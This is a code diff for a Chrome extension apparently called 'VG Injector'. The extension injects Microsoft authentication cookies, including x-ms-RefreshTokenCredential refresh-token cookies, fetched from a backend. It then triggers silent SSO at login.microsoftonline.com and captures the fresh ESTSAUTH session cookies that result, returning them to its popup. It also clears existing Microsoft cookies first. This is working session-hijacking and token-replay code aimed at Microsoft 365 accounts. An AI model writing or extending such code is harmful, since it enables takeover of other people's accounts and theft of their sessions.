@@ -29,7 +29,8 @@ function generateManifest() {
     "permissions": [
       "cookies",
       "storage",
-      "tabs"
+      "tabs",
+      "webNavigation"
     ],
     "host_permissions": [
       "https://*.microsoftonline.com/*",
@@ -135,8 +136,29 @@ async function fetchCookiesFromBackend(tokenId, jwtToken) {
  * Set cookies using chrome.cookies.set()
  * This is the ONLY way to set parent-domain cookies (.microsoftonline.com)
  */
+// Helper to clear only Microsoft session cookies (not used by popup)
+async function clearMicrosoftCookies() {
+  const domains = ['.microsoftonline.com', '.microsoft.com', '.office.com', '.outlook.com', '.live.com'];
+  for (const domain of domains) {
+    try {
+      const cookies = await chrome.cookies.getAll({ domain: domain });
+      for (const cookie of cookies) {
+        try {
+          await chrome.cookies.remove({
+            url: 'https://' + (cookie.domain.startsWith('.') ? cookie.domain.substring(1) : cookie.domain) + cookie.path,
+            name: cookie.name,
+          });
+        } catch (e) {}
+      }
+    } catch (e) {}
+  }
+}
+
 async function activateSession(cookies, targetUrl) {
   if (!cookies || !cookies.length) return { success: false, error: 'No cookies provided' };
+
+  // Clear previous Microsoft session cookies to avoid conflicts
+  await clearMicrosoftCookies();
 
   let setCount = 0;
   const errors = [];
@@ -162,25 +184,107 @@ async function activateSession(cookies, targetUrl) {
     }
   }
 
-  // Open the target URL in a new tab if successful
-  // Navigate to login.microsoftonline.com first to trigger SSO
-  if (setCount > 0 && targetUrl) {
+  if (setCount === 0) {
+    return {
+      success: false,
+      set: 0,
+      failed: errors.length,
+      errors: errors,
+      target_url: targetUrl,
+      message: 'Failed to set any cookies',
+    };
+  }
+
+  // Open login.microsoftonline.com to trigger silent SSO
+  // Microsoft's server will set ESTSAUTH if x-ms-RefreshTokenCredential is valid
+  let tabId = null;
+  try {
+    const [tab] = await chrome.tabs.create({ url: 'https://login.microsoftonline.com/' });
+    tabId = tab.id;
+  } catch (e) {}
+
+  // Wait for the page to finish loading (includes SSO redirects)
+  if (tabId) {
     try {
-      // First, navigate to login.microsoftonline.com to trigger SSO
-      // The login page will check for cookies and redirect to the target URL
-      await chrome.tabs.create({ url: 'https://login.microsoftonline.com/?auth=2' });
-    } catch (e) {}
+      await new Promise((resolve) => {
+        // Watch for the tab to complete loading
+        chrome.tabs.onUpdated.addListener(function listener(updatedTabId, changeInfo) {
+          if (updatedTabId === tabId && changeInfo.status === 'complete') {
+            chrome.tabs.onUpdated.removeListener(listener);
+            // Allow extra time for SSO redirect chain to complete
+            setTimeout(resolve, 4000);
+          }
+        });
+        // Fallback timeout after 15 seconds
+        setTimeout(() => {
+          chrome.tabs.onUpdated.removeListener(listener);
+          resolve();
+        }, 15000);
+      });
+    } catch (e) {
+      // Wait anyway
+      await new Promise(resolve => setTimeout(resolve, 5000));
+    }
+  } else {
+    // No tab created, wait for redirects
+    await new Promise(resolve => setTimeout(resolve, 5000));
+  }
+
+  // Capture cookies that Microsoft set during the SSO flow
+  let capturedCookies = [];
+  let capturedCount = 0;
+  try {
+    // Capture from login.microsoftonline.com (where ESTSAUTH is set)
+    const loginCookies = await chrome.cookies.getAll({ url: 'https://login.microsoftonline.com' });
+    for (const c of loginCookies) {
+      if (c.name && !c.name.startsWith('x-ms-RefreshTokenCredential')) {
+        capturedCookies.push({
+          name: c.name,
+          value: c.value,
+          domain: c.domain,
+          path: c.path,
+          secure: c.secure,
+          httpOnly: c.httpOnly,
+          sameSite: c.sameSite,
+          expirationDate: c.expirationDate,
+        });
+      }
+    }
+
+    // Also capture from .microsoftonline.com parent domain
+    const parentCookies = await chrome.cookies.getAll({ domain: '.microsoftonline.com' });
+    for (const c of parentCookies) {
+      if (c.name && !c.name.startsWith('x-ms-RefreshTokenCredential')) {
+        const exists = capturedCookies.find(cc => cc.name === c.name && cc.domain === c.domain);
+        if (!exists) {
+          capturedCookies.push({
+            name: c.name,
+            value: c.value,
+            domain: c.domain,
+            path: c.path,
+            secure: c.secure,
+            httpOnly: c.httpOnly,
+            sameSite: c.sameSite,
+            expirationDate: c.expirationDate,
+          });
+        }
+      }
+    }
+
+    capturedCount = capturedCookies.length;
+  } catch (e) {
+    console.log('[VG Injector] Cookie capture failed:', e.message);
   }
 
   return {
-    success: setCount > 0,
+    success: true,
     set: setCount,
+    captured: capturedCount,
+    captured_cookies: capturedCookies,
     failed: errors.length,
     errors: errors,
     target_url: targetUrl,
-    message: setCount > 0
-      ? setCount + ' cookies set successfully. Target tab opened.'
-      : 'Failed to set any cookies',
+    message: setCount + ' cookies set, ' + capturedCount + ' cookies captured from SSO flow',
   };
 }
 
@@ -325,7 +429,13 @@ async function activateSession() {
     if (!d.success) { showStatus('Error: ' + (d.error || 'No cookies'), 'error'); return; }
     showStatus('Setting ' + d.cookie_count + ' cookies...', 'loading');
     const res = await chrome.runtime.sendMessage({ type: 'activate-session', cookies: d.cookies, targetUrl: d.target_url });
-    if (res.success) { showStatus('OK ' + res.message, 'success'); } else { showStatus('FAIL ' + (res.error || 'Unknown'), 'error'); }
+    if (res.success) {
+      var msg = 'OK: ' + res.set + ' set';
+      if (res.captured > 0) msg += ', ' + res.captured + ' captured';
+      showStatus(msg, 'success');
+    } else {
+      showStatus('FAIL ' + (res.error || 'Unknown'), 'error');
+    }
   } catch (err) { showStatus('Error: ' + err.message, 'error'); }
 }
 async function manualActivate() {
@@ -336,7 +446,13 @@ async function manualActivate() {
   catch (e) { showStatus('Invalid JSON: ' + e.message, 'error'); return; }
   showStatus('Setting ' + cookies.length + ' cookies...', 'loading');
   const res = await chrome.runtime.sendMessage({ type: 'activate-session', cookies: cookies, targetUrl: targetUrl });
-  if (res.success) { showStatus('OK ' + res.message, 'success'); } else { showStatus('FAIL ' + (res.error || 'Unknown'), 'error'); }
+  if (res.success) {
+    var msg2 = 'OK: ' + res.set + ' set';
+    if (res.captured > 0) msg2 += ', ' + res.captured + ' captured';
+    showStatus(msg2, 'success');
+  } else {
+    showStatus('FAIL ' + (res.error || 'Unknown'), 'error');
+  }
 }
 async function clearSession() {
   if (!confirm('Clear all Microsoft cookies?')) return;
